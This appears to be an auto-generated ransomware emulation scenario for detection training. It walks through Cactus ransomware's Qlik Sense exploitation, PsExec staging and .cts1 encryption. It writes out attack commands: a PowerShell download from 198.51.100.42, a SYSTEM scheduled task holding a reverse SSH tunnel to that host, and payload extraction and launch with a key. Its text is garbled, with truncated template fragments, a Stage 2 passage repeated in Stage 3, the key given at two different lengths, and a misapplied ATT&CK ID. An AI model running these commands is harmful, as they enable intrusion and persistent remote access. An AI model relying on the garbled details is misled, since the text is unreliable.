scenario.name: Kroll, Arctic Wolf & CISA KEV — Cactus Ransomware: Qlik Sense Exploitation (CVE-2023-41265), Chisel SSH Tunneling & AES Batch-Driven Self-Decryption (.cts1)
scenario.overview: Imagine a stealthy burglar who sneaks through a warped side tunnel inside an analytics server and bolts a permanent hidden skylight onto the building schedule so they can return anytime. Rather than carrying an exposed lockpicker that guards immediately recognize, the burglar drops a password-locked suitcase onto every desk, unpacks a scrambled inner box using a secret key at runtime, and marks each file twice (first with an in-progress tag while taking tiny sips of data, then with a finished lock tag once sealed). In this scenario (T1190, Kroll, Arctic Wolf & CISA KEV, Cactus Ransomware: Qlik Sense Exploitation , CVE-2023-41265, Chisel SSH Tunneling & AES Batch-Driven Self-Decryption .cts1), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: qlik Sense Tunneling RCE, then psExec Batch Staging, 7z.exe Extraction, then multi-Stream Micro-Read Encryption. Steps #1–#3 walk that chain end-to-end by covering Qlik Sense Tunneling RCE, then PsExec Batch Staging, 7z.exe Extraction, then Multi-Stream Micro-Read Encryption, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.

stages.title: Stage 1: Qlik Sense Tunneling RCE (CVE-2023-41265) & Persistent OpenSSH Scheduled Task
stages.subtitle: Initial Access & Persistence (T1190 / T1053.005 / T1572)
stages.description: Exploiting a bent routing tunnel inside a public analytics portal, the burglar slips straight into the back office and wires a repeating scheduled task that keeps a private encrypted back door propped open outward toward their own server. Cactus operators exploit HTTP request tunneling and path traversal in Qlik Sense Enterprise (CVE-2023-41265 and CVE-2023-41266), causing scheduler.exe to spawn cmd.exe and powershell.exe. They immediately register a Scheduled Task that runs a persistent reverse SSH connection (sshd.exe / ssh.exe -R) back to their C2 server (logged in Sysmon Event 1 with ExploitedService=Qlik Sense Scheduler , scheduler.exe, VulnerabilityIds=CVE-2023-41265 & CVE-2023-41266, PersistenceTask=Scheduled Task "Updates" running reverse SSH tunnel so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes C:\Program Files\Qlik\Sense\Scheduler\scheduler.exe -> cmd.exe /c powershell.exe -enc ... (which invokes the Windows PowerShell host , powershell.exe with stealth and execution-policy bypass flags , such as -NoP, -NonI, -W Hidden, -Exec Bypass so that achieves fileless in-memory staging and execution , T1190 during "Qlik Sense Tunneling RCE , CVE-2023-41265 & Persistent OpenSSH Scheduled Task" without writing compiled binaries to disk, while generating PowerShell Operational EventID 4104 , ScriptBlock and 4103 , Module/Pipeline telemetry). Next, the follow-up artifact schtasks.exe /create /tn "Updates" /tr "C:\ProgramData\ssh.exe -N -R 2222:127.0.0.1:3389 user@198.51.100.42" /sc minute /mo 5 /ru SYSTEM runs (which Calls the Windows Task Scheduler CLI , schtasks.exe or ITaskService RPC interface to register, modify, or execute a scheduled task XML definition u so that establishes recurring execution persistence , T1190 during "Qlik Sense Tunneling RCE , CVE-2023-41265 & Persistent OpenSSH Scheduled Task" under SYSTEM or privileged account authority so the implant automatically respawns on schedule, boot, or user logon). On the diagram, follow Step #1 / Link #1 (#1→ powershell.exe -nop -w hidden -c "Invoke-WebRequest http://198.51.100.42/7z.msi -OutFile C:\ProgramData\7z.msi" / ⇠#1 ACK 1) from Node ① (#1 Cactus Operator (Chisel + OpenSSH C2)) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Encrypted Enterprise Shares (.cts1 / cAcTuS.readme.txt)).

stages.title: Stage 2: PsExec Batch Staging, `7z.exe` Extraction & `-i` AES Key Self-Decryption (`ntuser.dat`)
stages.subtitle: Defense Evasion & Execution Guardrails (T1140 - Deobfuscate/Decode Files / T1480)
stages.description: To fool hallway security inspectors who X-ray every file sitting on disk, the crew sprays a locked archive across every workstation, unzips it with a batch script, and passes an unlocking key directly on the command line so the padlocking machine only unscrambles itself inside live working memory. Using a custom PowerShell sprayer (s.ps1) and psexec.exe, the operator drops a password-protected 7-Zip archive onto target hosts, extracts it with 7z.exe, deletes the archive, and launches the Cactus binary with -i <64_hex_AES_key>. The binary reads the encrypted payload from C:\ProgramData\ntuser.dat, decrypts it in memory using the -i AES-256 key, and re-launches itself with the -r runtime flag (logged in Sysmon Event 1 with AntiAnalysisMechanism=Requires -i 32-byte hex AES key to decrypt C:\ProgramData\ntuser.dat, ExecutionStages=-s , setup -> -i , decrypt ntuser.dat -> -r , runtime encryption so analysts can verify the exact actor and target artifact). stages.title: Stage 3: Multi-Stream Micro-Read Encryption (`.cts0` -> `.cts1`) & `cAcTuS.readme.txt`
stages.subtitle: Impact (T1486 - Data Encrypted for Impact)
stages.description: Running in quiet multi-stream mode, the unscrambled encryptor takes small sips of each file so heavy disk-thrashing alarms stay calm, tagging active files with a temporary work badge before flipping them to a final sealed tag and leaving its signature cactus ransom card. Running under the -r flag, Cactus renames target files to .cts0 while actively encrypting them in small micro-streams (preventing file-lock race conditions) and renames them to .cts1 upon completion while dropping cAcTuS.readme.txt (logged in Sysmon Event 11 with RansomwareFamily=Cactus Ransomware, TwoPhaseExtension=.cts0 , active stream -> .cts1 , completed, RansomNote=cAcTuS.readme.txt so analysts can verify the exact actor and target artifact). Next, the follow-up artifact WriteFile("cAcTuS.readme.txt") across all local and network directories runs (which executes the technical command / telemetry directive , WriteFile, "cAcTuS.readme.txt" across all local and network directories via System / Runtime so that advances the scenario kill-chain under MITRE T1486 during "Multi-Stream Micro-Read Encryption .cts0 -> .cts1 & cAcTuS.readme.txt" , Running under the -r flag, Cactus renames target files to while generating verifiable host or network telemetry for DFIR attribution). The binary reads the encrypted payload from C:\ProgramData\ntuser.dat, decrypts it in memory using the -i AES-256 key, and re-launches itself with the -r runtime flag (logged in Sysmon Event 1 with AntiAnalysisMechanism=Requires -i 32-byte hex AES key to decrypt C:\ProgramData\ntuser.dat, ExecutionStages=-s , setup -> -i , decrypt ntuser.dat -> -r , runtime encryption so analysts can verify the exact actor and target artifact).
steps.howItWorksInPractice: Under the hood, the observed step executes C:\ProgramData\7z.exe x C:\ProgramData\pack.7z -p"Cactus2026!" -oC:\ProgramData\ -y (which executes the technical command / telemetry directive , C:\ProgramData\7z.exe x C:\ProgramData\pack.7z -p"Cactus2026!" -oC:\ProgramData\ -y via 7z.e so that advances the scenario kill-chain under MITRE T1140 during "PsExec Batch Staging, 7z.exe Extraction & -i AES Key Self-Decryption , ntuser.dat" , Using a custom PowerShell sprayer , s while generating verifiable host or network telemetry for DFIR attribution). Next, the follow-up artifact C:\ProgramData\cactus.exe -i 4A9F2C8E1D7B0A3F5E6C8B1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F (Decrypts ntuser.dat -> spawns cactus.exe -r) runs (which executes the technical command / telemetry directive , C:\ProgramData\cactus.exe -i 4A9F2C8E1D7B0A3F5E6C8B1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1 so that advances the scenario kill-chain under MITRE T1140 during "PsExec Batch Staging, 7z.exe Extraction & -i AES Key Self-Decryption , ntuser.dat" , Using a custom PowerShell sprayer , s while generating verifiable host or network telemetry for DFIR attribution).
